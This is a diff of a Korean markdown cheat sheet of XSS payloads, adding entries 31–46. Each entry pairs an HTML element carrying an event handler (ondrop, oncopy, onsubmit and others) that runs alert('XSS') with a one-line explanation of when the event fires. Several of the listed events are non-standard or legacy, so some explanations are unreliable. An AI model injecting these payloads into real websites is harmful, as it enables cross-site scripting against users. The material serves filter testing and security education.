@@ -309,16 +309,143 @@
 
 ---
 
-### 30. **`onbouncem`**: 의심스러운 오타 또는 사용자 정의 이벤트
+### 30. **`onbounce`**: 마퀴(marquee) 태그에서 사용되었던 이벤트로, 스크롤이 양쪽 끝에서 튕길 때(바운스될 때) 발생하는 동작을 정의
 
 ```html
-<element onbouncem="alert('XSS - onbouncem')">Bounce me</element>
+<element onbounce="alert('XSS - onbouncem')">Bounce me</element>
 ```
-
-> 해당 이벤트는 오타일 가능성이 있으므로 정상적인 HTML 이벤트가 아니며, **사용자 정의 이벤트**일 가능성이 높습니다.
 
 ---
 
+#### 31. **`ondragleave`**
+
+```html
+<div ondragleave="alert('XSS - ondragleave')">Drag me out</div>
+```
+
+> **`ondragleave`** 이벤트는 사용자가 드래그한 요소가 해당 영역을 떠날 때 발생합니다.
+
+#### 32. **`onunload`**
+
+```html
+<body onunload="alert('XSS - onunload')">Refresh the page</body>
+```
+
+> **`onunload`** 이벤트는 페이지나 문서가 언로드 될 때 발생합니다.
+
+#### 33. **`ondrop`**
+
+```html
+<div ondrop="alert('XSS - ondrop')">Drop something here</div>
+```
+
+> **`ondrop`** 이벤트는 사용자가 요소에 드래그하여 놓을 때 발생합니다.
+
+#### 34. **`oncopy`**
+
+```html
+<p oncopy="alert('XSS - oncopy')">Copy me!</p>
+```
+
+> **`oncopy`** 이벤트는 사용자가 텍스트나 콘텐츠를 복사할 때 발생합니다.
+
+#### 35. **`oncut`**
+
+```html
+<p oncut="alert('XSS - oncut')">Cut me!</p>
+```
+
+> **`oncut`** 이벤트는 사용자가 텍스트나 콘텐츠를 잘라낼 때 발생합니다.
+
+#### 36. **`onfinish`**
+
+```html
+<video onfinish="alert('XSS - onfinish')">Finish playing</video>
+```
+
+> **`onfinish`** 이벤트는 애니메이션이나 비디오가 끝날 때 발생합니다.
+
+#### 37. **`onscroll`**
+
+```html
+<div onscroll="alert('XSS - onscroll')">Scroll me</div>
+```
+
+> **`onscroll`** 이벤트는 사용자가 페이지나 요소를 스크롤할 때 발생합니다.
+
+#### 38. **`onreset`**
+
+```html
+<form onreset="alert('XSS - onreset')">Reset the form</form>
+```
+
+> **`onreset`** 이벤트는 폼이 리셋될 때 발생합니다.
+
+#### 39. **`onstart`**
+
+```html
+<video onstart="alert('XSS - onstart')">Start playing</video>
+```
+
+> **`onstart`** 이벤트는 애니메이션이나 비디오가 시작될 때 발생합니다.
+
+#### 40. **`onrowexit`**
+
+```html
+<tr onrowexit="alert('XSS - onrowexit')">Row exit event</tr>
+```
+
+> **`onrowexit`** 이벤트는 `<tr>` 요소가 포커스를 잃을 때 발생합니다.
+
+#### 41. **`ondeactivate`**
+
+```html
+<input ondeactivate="alert('XSS - ondeactivate')" />
+```
+
+> **`ondeactivate`** 이벤트는 요소가 비활성화될 때 발생합니다.
+
+#### 42. **`onbeforecut`**
+
+```html
+<p onbeforecut="alert('XSS - onbeforecut')">Before cut</p>
+```
+
+> **`onbeforecut`** 이벤트는 콘텐츠를 잘라내기 전에 발생합니다.
+
+#### 43. **`onactivate`**
+
+```html
+<p onactivate="alert('XSS - onactivate')">Activate me</p>
+```
+
+> **`onactivate`** 이벤트는 요소가 활성화될 때 발생합니다.
+
+#### 44. **`onsubmit`**
+
+```html
+<form onsubmit="alert('XSS - onsubmit')">Submit the form</form>
+```
+
+> **`onsubmit`** 이벤트는 폼이 제출될 때 발생합니다.
+
+#### 45. **`onchange`**
+
+```html
+<input onchange="alert('XSS - onchange')" />
+```
+
+> **`onchange`** 이벤트는 입력값이 변경될 때 발생합니다.
+
+#### 46. **`onpaste`**
+
+```html
+<p onpaste="alert('XSS - onpaste')">Paste here</p>
+```
+
+> **`onpaste`** 이벤트는 사용자가 콘텐츠를 붙여넣을 때 발생합니다.
+
+---
 
 ## 🌼 일반 핸들러를 사용한 **alert** 띄우는 공격 예제. 
 이벤트 핸들러를 제외한 나머지
@@ -326,7 +453,6 @@
 ---
 
 
-## **XSS 페이로드 예시**
 
 ### 1. **`layer`**
 
